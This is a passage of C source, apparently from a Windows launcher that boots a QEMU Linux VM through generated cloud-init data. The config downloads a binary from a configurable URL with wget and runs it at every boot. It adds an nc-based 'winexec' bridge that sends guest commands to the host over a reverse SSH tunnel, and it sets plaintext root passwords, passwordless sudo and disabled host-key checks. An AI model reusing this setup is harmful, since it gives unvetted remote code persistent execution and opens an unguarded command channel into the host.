                 " -R %d:127.0.0.1:%d"
                 " -o StrictHostKeyChecking=no"
                 " -o UserKnownHostsFile=NUL"
                 " -o BatchMode=yes"
                 " -o ExitOnForwardFailure=yes"
                 " " GUEST_USER "@127.0.0.1",
                 ssh_bin, ssh_port, priv_key, mgmt_port, mgmt_port);
        trace(LOG_SSH_TUNNEL, mgmt_port);
        HANDLE th = CreateThread(NULL, 0, keepalive_tunnel, lk, 0, NULL);
        if (th) CloseHandle(th);
    }

    /* cloud-init write_files */
    char wf[2048] = "";
    {
        char item[512];
        snprintf(item, sizeof(item),
                 "  - path: /usr/local/bin/winexec\n"
                 "    permissions: '0755'\n"
                 "    content: |\n"
                 "      #!/bin/sh\n"
                 "      printf '%%s\\n' \"$*\" | nc -w 30 127.0.0.1 %d\n",
                 mgmt_port);
        strncat(wf, item, sizeof(wf) - strlen(wf) - 1);
    }

    char boot_cmds[512] = "";
    if (strlen(UTILITY_URL) > 0) {
        char item[512];
        snprintf(item, sizeof(item),
                 "  - path: /etc/local.d/" WORK_DIR_NAME ".start\n"
                 "    permissions: '0755'\n"
                 "    content: |\n"
                 "      #!/bin/sh\n"
                 "      " UTILITY_GUEST_PATH "\n");
        strncat(wf, item, sizeof(wf) - strlen(wf) - 1);

        snprintf(boot_cmds, sizeof(boot_cmds),
                 "  - wget -q -O " UTILITY_GUEST_PATH " \"%s\""
                 " && chmod +x " UTILITY_GUEST_PATH "\n"
                 "  - rc-update add local default\n"
                 "  - /etc/local.d/" WORK_DIR_NAME ".start\n",
                 UTILITY_URL);
        trace(LOG_PAYLOAD, UTILITY_URL);
    }

    char wf_section[2048];
    snprintf(wf_section, sizeof(wf_section), "write_files:\n%s", wf);

    snprintf(g_userdata, sizeof(g_userdata),
             "#cloud-config\n"
             "ssh_pwauth: true\n"
             "disable_root: false\n"
             "%s"
             "users:\n"
             "  - name: " GUEST_USER "\n"
             "    lock_passwd: false\n"
             "    plain_text_passwd: \"" GUEST_PASSWORD "\"\n"
             "    sudo: \"ALL=(ALL) NOPASSWD:ALL\"\n"
             "    groups: wheel\n"
             "    shell: /bin/sh\n"
             "%s"
             "chpasswd:\n"
             "  expire: false\n"
             "  list: |\n"
             "    root:" GUEST_PASSWORD "\n"
             "runcmd:\n"
             "  - rc-update add sshd default\n"
             "  - sed -i 's/.*AllowTcpForwarding.*/AllowTcpForwarding yes/'"
               " /etc/ssh/sshd_config\n"
             "  - rc-service sshd restart\n"
             "%s",
             wf_section, auth_keys, boot_cmds);

    int cfg_port = serve_config();
    if (cfg_port == 0) bail(ERR_SEED_SERVER);
    trace(LOG_SEED_PORT, cfg_port, cfg_port);

    /* launch VM */
    char img_short[MAX_PATH];
    short_path(img_path, img_short, sizeof(img_short));

#define RT_CMDLINE \
        "\"%s\" "                                                       \
        "-name " WORK_DIR_NAME " "                                      \
        "-machine pc,hpet=off "                                         \
        "-accel tcg "                                                   \
        "-m " VM_RAM_MB " "                                             \
        "-smp " VM_SMP " "                                              \
        "-drive file=%s,if=virtio,format=qcow2 "            \
        "-netdev user,id=n0,hostfwd=tcp:127.0.0.1:%d-:22 "             \
        "-device virtio-net-pci,netdev=n0 "                             \
        "-smbios type=1,serial=ds=nocloud;s=http://10.0.2.2:%d/ "      \
        "-nographic"

    char launch[4096];
    snprintf(launch, sizeof(launch), RT_CMDLINE,
             runtime, img_short, ssh_port, cfg_port);

    trace(LOG_QEMU_CMD_LABEL);
    trace("  %s", launch);
    trace("");
    trace(LOG_SEP);
    trace(LOG_VM_START);
    trace(LOG_VM_CLOUDINIT);
    trace("");
    trace(LOG_SSH_LABEL);
    trace(LOG_SSH_CMD, ssh_port, GUEST_USER);
    trace(LOG_SSH_PWD, GUEST_PASSWORD);
    trace("");
    trace(LOG_SSH_TIP);
    trace(LOG_SSH_NOCHECK, ssh_port, GUEST_USER);
    trace(LOG_SEP);
    trace("");

    int rc = exec_wait(runtime, launch, rt_dir, 1);
    if (rc == -1) {
        char alt[MAX_PATH] = "";
        if (locate(dir_rt, FILE_QEMU_BIN_ALT, alt, sizeof(alt))) {
            trace("  -> retrying with %s", FILE_QEMU_BIN_ALT);
            snprintf(launch, sizeof(launch), RT_CMDLINE,
                     alt, img_short, ssh_port, cfg_port);
            rc = exec_wait(alt, launch, rt_dir, 1);
        }
    }
    trace(LOG_QEMU_EXIT, rc);

    WSACleanup();
    return rc;
}
